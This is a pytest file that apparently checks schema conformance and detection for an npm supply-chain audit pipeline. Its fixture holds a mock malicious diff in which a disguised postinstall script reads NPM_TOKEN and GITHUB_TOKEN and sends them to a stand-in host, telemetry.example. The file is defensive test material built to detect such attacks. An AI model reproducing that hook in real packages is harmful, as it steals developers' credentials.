"""Schema conformance tests for the dossier / report / SFT builders.

These tests do not hit the network. They build a fake VersionPair from
the bundled apiary attack-catalog-style patterns and validate that the
resulting JSON documents conform to the canonical schemas in
``finetune/contracts/``.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[3]
CONTRACTS = REPO_ROOT / "finetune" / "contracts"


def _load_schema(name: str) -> dict:
    return json.loads((CONTRACTS / name).read_text(encoding="utf-8"))


def _validator(schema_name: str):
    try:
        import jsonschema
    except ImportError:
        pytest.skip("jsonschema not installed")
    return jsonschema.Draft202012Validator(_load_schema(schema_name))


def _fake_version_pair():
    from finetune.python.pipeline.version_pair_extractor import FileChange, VersionPair

    return VersionPair(
        package="pretty-cli-colors",
        unpatched_version="1.4.6",
        patched_version="1.4.7",
        advisory_ids=["GHSA-FAKE-0001"],
        severity="high",
        file_changes=[
            FileChange(
                path="package.json",
                change_kind="modified",
                added_lines=1,
                removed_lines=0,
                unified_diff='--- a/package.json\n+++ b/package.json\n@@ -3,1 +3,2 @@\n+  "scripts": { "postinstall": "node ./postinstall.js" },\n',
                file_size_before=120,
                file_size_after=180,
            ),
            FileChange(
                path="postinstall.js",
                change_kind="added",
                added_lines=8,
                removed_lines=0,
                unified_diff=(
                    "--- a/postinstall.js\n+++ b/postinstall.js\n"
                    "@@ -0,0 +1,8 @@\n"
                    "+const https = require('https');\n"
                    "+const token = process.env.NPM_TOKEN;\n"
                    "+const gh = process.env.GITHUB_TOKEN;\n"
                    "+const req = https.request('https://telemetry.example/log');\n"
                    "+req.write(JSON.stringify({ token, gh }));\n"
                    "+req.end();\n"
                    "+// telemetry helper for cli color detection\n"
                    "+module.exports = {};\n"
                ),
                file_size_before=0,
                file_size_after=400,
            ),
        ],
        package_json_changes={
            "before": {
                "scripts": {},
                "dependencies": {},
                "devDependencies": {},
                "optionalDependencies": {},
                "repository": None,
                "version": "1.4.6",
            },
            "after": {
                "scripts": {"postinstall": "node ./postinstall.js"},
                "dependencies": {"tiny-postinstall-helper": "^0.1.0"},
                "devDependencies": {},
                "optionalDependencies": {},
                "repository": None,
                "version": "1.4.7",
            },
        },
        extraction_method="tarball_diff",
        notes=["unpatched_tarball_bytes=1024", "patched_tarball_bytes=1280"],
    )


def _fake_scraped_case() -> dict:
    return {
        "schema_version": "modulewarden.scraped_case.v1",
        "case_id": "ghsa_FAKE_0001_pretty_cli_colors_0",
        "source": "github_advisory",
        "case_type": "incident_replay",
        "package": "pretty-cli-colors",
        "advisory_ids": ["GHSA-FAKE-0001"],
        "severity": "critical",
        "summary": "Suspected supply-chain compromise of pretty-cli-colors@1.4.7.",
        "cwes": ["CWE-506"],
        "affected_range": "= 1.4.7",
        "first_patched_version": None,
        "candidate_versions": [
            {"role": "likely_affected", "version": "1.4.7", "published_at": "2026-05-29T18:20:00Z"}
        ],
        "benign_neighbor_versions": [
            {"role": "benign_before", "version": "1.4.6", "published_at": "2026-05-01T00:00:00Z"}
        ],
        "references": ["https://github.com/advisories/GHSA-FAKE-0001"],
        "source_code_location": "https://github.com/example/pretty-cli-colors",
        "npm": None,
        "osv_ids": [],
        "triage_status": "candidate",
        "scraped_at": "2026-05-28T10:00:00Z",
    }


def test_dossier_validates_against_schema():
    from finetune.python.pipeline.dossier_builder import build_dossier

    dossier = build_dossier(_fake_scraped_case(), _fake_version_pair())
    validator = _validator("audit-dossier.schema.json")
    errors = list(validator.iter_errors(dossier))
    assert not errors, f"dossier failed schema: {[e.message for e in errors[:5]]}"


def test_report_validates_against_schema():
    from finetune.python.pipeline.dossier_builder import build_dossier
    from finetune.python.pipeline.report_template import build_report

    case = _fake_scraped_case()
    dossier = build_dossier(case, _fake_version_pair())
    report = build_report(dossier, scraped_case=case)
    validator = _validator("audit-report.schema.json")
    errors = list(validator.iter_errors(report))
    assert not errors, f"report failed schema: {[e.message for e in errors[:5]]}"


def test_sft_record_validates_against_schema():
    from finetune.python.pipeline.dossier_builder import build_dossier
    from finetune.python.pipeline.report_template import build_report
    from finetune.python.pipeline.sft_pair_builder import build_sft_record

    case = _fake_scraped_case()
    dossier = build_dossier(case, _fake_version_pair())
    report = build_report(dossier, scraped_case=case)
    sft = build_sft_record(dossier, report, split="train", source="incident_replay")
    validator = _validator("sft-record.schema.json")
    errors = list(validator.iter_errors(sft))
    assert not errors, f"sft record failed schema: {[e.message for e in errors[:5]]}"


def test_report_cites_only_real_evidence_refs():
    from finetune.python.pipeline.dossier_builder import build_dossier
    from finetune.python.pipeline.report_template import build_report

    case = _fake_scraped_case()
    dossier = build_dossier(case, _fake_version_pair())
    report = build_report(dossier, scraped_case=case)
    valid_ids = {ev["id"] for ev in dossier["evidence_index"]}
    for finding in report["primary_findings"]:
        for ref in finding["evidence_refs"]:
            assert ref in valid_ids, (
                f"report cited invented evidence ref {ref!r} not in dossier"
            )
    assert report["output_integrity"]["invented_evidence_refs"] == []
    assert report["output_integrity"]["all_claims_have_evidence_refs"] is True


def test_incident_replay_verdict_is_block():
    """Per labeling-rubric: incident_replay -> block, high, critical."""
    from finetune.python.pipeline.dossier_builder import build_dossier
    from finetune.python.pipeline.report_template import build_report

    case = _fake_scraped_case()
    dossier = build_dossier(case, _fake_version_pair())
    report = build_report(dossier, scraped_case=case)
    assert report["verdict"] == "block"
    assert report["confidence"] == "high"
    assert report["risk_level"] == "critical"


def test_capability_detection_credential_and_network():
    """Postinstall + NPM_TOKEN + https.request must produce both deltas."""
    from finetune.python.pipeline.dossier_builder import build_dossier

    dossier = build_dossier(_fake_scraped_case(), _fake_version_pair())
    caps = {d["capability"] for d in dossier["capability_deltas"]}
    assert "lifecycle_script" in caps
    assert "credential_or_env_access" in caps
    assert "network_access" in caps


def test_split_assignment_is_deterministic():
    """Same package name -> same split forever."""
    from finetune.python.pipeline.corpus_walker import _split_for_package

    s1 = _split_for_package("pretty-cli-colors")
    s2 = _split_for_package("pretty-cli-colors")
    assert s1 == s2
    assert s1 in ("train", "validation", "test")
